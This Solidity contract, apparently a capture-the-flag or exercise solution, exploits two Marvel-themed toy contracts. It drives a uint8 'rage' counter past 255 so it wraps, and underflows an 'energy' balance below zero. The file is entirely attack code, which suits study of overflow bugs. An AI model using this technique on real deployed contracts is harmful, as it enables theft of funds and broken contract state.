// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {HulkRageToken} from "./Post/HulkRageToken.sol";
import {IronManSuit} from "./Post/IronManSuit.sol";

contract ThorBreaker {
    HulkRageToken public hulk;
    IronManSuit public ironMan;

    constructor(address _hulk, address _ironMan) {
        hulk = HulkRageToken(_hulk);
        ironMan = IronManSuit(_ironMan);
    }

    function breakHulk() external {
        // Step 1: Increase rage close to max (255)
        hulk.getAngry(250); // rage = 250

        // Step 2: Trigger overflow
        // 250 + 10 = 260 → wraps to 4
        hulk.getAngry(10);
    }

    function breakIronMan() external {
        // Step 1: Start with energy = 0
        // Step 2: Drain 100 → underflow to 2^256 - 100
        ironMan.drainEnergy(100);
    }
}
